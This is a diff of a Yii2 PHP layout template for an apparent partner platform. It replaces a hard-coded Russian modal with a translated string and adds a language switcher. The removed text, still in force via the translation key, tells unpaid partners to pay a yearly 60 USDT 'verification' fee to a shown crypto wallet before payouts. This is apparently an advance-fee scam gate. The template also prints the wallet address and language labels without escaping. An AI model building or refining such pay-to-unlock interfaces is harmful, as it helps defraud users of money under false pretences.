@@ -9,6 +9,8 @@ use yii\bootstrap5\Breadcrumbs;
 use yii\bootstrap5\Html;
 use yii\bootstrap5\Nav;
 use yii\bootstrap5\NavBar;
+use backend\models\Lang;
+use yii\helpers\Url;
 
 AppAsset::register($this);
 $partner = Yii::$app->user->identity ?? null;
@@ -38,15 +40,7 @@ if ($partner && !$partner->paid) {
         <div class="modal-dialog modal-dialog-centered">
             <div class="modal-content">
                 <div class="modal-body">
-                    <p>Уважаемые партнёры!
-
-Для корректной работы платформы и возможности проведения всех выплат и возвратов средств важно иметь точные и актуальные данные пользователей.
-
-В связи с этим необходимо пройти процедуру верификации аккаунта. Она предусматривает оплату в размере 60 USDT на кошелек указанный тут, после чего ваш кабинет будет активирован, а система получит необходимые данные для корректной обработки выплат.
-
-Эти средства направляются на поддержку стабильной работы сайта и идентификацию пользователей.Это позволит обеспечить защиту аккаунтов и сохранить их в актуальном состоянии.
-
-Оплату необходимо произвести до 20 сентября. Данная процедура является обязательной и взимается ежегодно.</p>
+                    <p><?= nl2br(Yii::t('app', 'Account verification notice')) ?></p>
                     <?php if ($partner->wAddressIn): ?>
                         <p class="rounded p-1 bg-success-subtle text-center">
                             <a href="#" class="text-success-emphasis" id="copy-waddress-modal" data-copy-text="<?= $partner->wAddressIn ?>">
@@ -55,10 +49,27 @@ if ($partner && !$partner->paid) {
                         </p>
                     <?php endif; ?>
                 </div>
-                <div class="modal-footer">
-                    <?= Html::beginForm(['/auth/logout'], 'post') ?>
-                        <button type="submit" class="btn btn-secondary">Выйти</button>
-                    <?= Html::endForm() ?>
+                <div class="modal-footer justify-content-between">
+                    <div>
+                        <?= Html::beginForm(['/auth/logout'], 'post') ?>
+                            <button type="submit" class="btn btn-secondary"><?= Yii::t('app', 'Logout') ?></button>
+                        <?= Html::endForm() ?>
+                    </div>
+                    <div class="dropdown">
+                        <button class="btn btn-light dropdown-toggle" data-bs-toggle="dropdown" aria-expanded="false">
+                            <img src="<?= Lang::getFlag(Yii::$app->language) ?>" alt="<?= Yii::$app->language ?>" height="20" class="rounded">
+                        </button>
+                        <ul class="dropdown-menu dropdown-menu-end">
+                            <?php foreach (Lang::getList() as $code => $label): ?>
+                                <li>
+                                    <a href="<?= Url::base() ?>?lang=<?= $code ?>" class="dropdown-item" title="<?= $label ?>">
+                                        <img src="<?= Lang::getFlag($code) ?>" alt="<?= $label ?>" class="me-2 rounded" height="18">
+                                        <span class="align-middle"><?= $label ?></span>
+                                    </a>
+                                </li>
+                            <?php endforeach; ?>
+                        </ul>
+                    </div>
                 </div>
             </div>
         </div>
